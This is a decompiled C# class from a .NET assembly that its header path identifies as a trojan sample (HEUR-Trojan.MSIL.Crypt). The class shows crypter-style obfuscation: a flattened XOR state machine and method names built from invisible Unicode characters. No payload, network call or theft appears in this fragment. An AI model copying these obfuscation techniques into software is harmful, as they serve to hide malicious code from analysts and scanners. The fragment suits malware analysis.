// Decompiled with JetBrains decompiler
// Type: SMALLR.Messages.CustomerPolicyMessage
// Assembly: SMALLR, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6D2A6844-DF52-4C3E-A39E-6BCAB729CFBF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-cb64837983ad6cdbc07df3dc8272a72b4d1b41314b797cc4f9bb67cd37f7b0f5.exe

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace SMALLR.Messages
{
  public class CustomerPolicyMessage : PagePolicyMessage
  {
    [MethodImpl(MethodImplOptions.NoInlining)]
    public CustomerPolicyMessage(Image param, Size connection)
      : base(param, connection)
    {
label_1:
      int num1 = 235241931;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2025848877)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * 55700108 ^ 473823265;
            continue;
          case 2:
            List<int[,]> numArrayList1 = new List<int[,]>();
            List<int[,]> numArrayList2 = numArrayList1;
            int[,] numArray = new int[2, 2];
            // ISSUE: field reference
            CustomerPolicyMessage.\u200C⁭‌‮‎​⁫‍‍‭​‎‪⁪‮⁪‪‏⁮⁯⁬‭‏⁬​‪‫‭‎‬‪‭⁫​⁮⁮⁪‫⁪‎‮((Array) numArray, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0037D037A876D9C65AD35B2C7802BEE3402CE7A4D85F98B8B63413AA8E184010DC3));
            numArrayList2.Add(numArray);
            this.DestroyAttr(numArrayList1);
            num1 = (int) num2 * -1986912716 ^ 1284163096;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    internal static bool DefinePrototype() => true;

    internal static bool CalcPrototype() => false;

    static void \u200C⁭‌‮‎​⁫‍‍‭​‎‪⁪‮⁪‪‏⁮⁯⁬‭‏⁬​‪‫‭‎‬‪‭⁫​⁮⁮⁪‫⁪‎‮([In] Array obj0, [In] RuntimeFieldHandle obj1) => RuntimeHelpers.InitializeArray(obj0, obj1);
  }
}
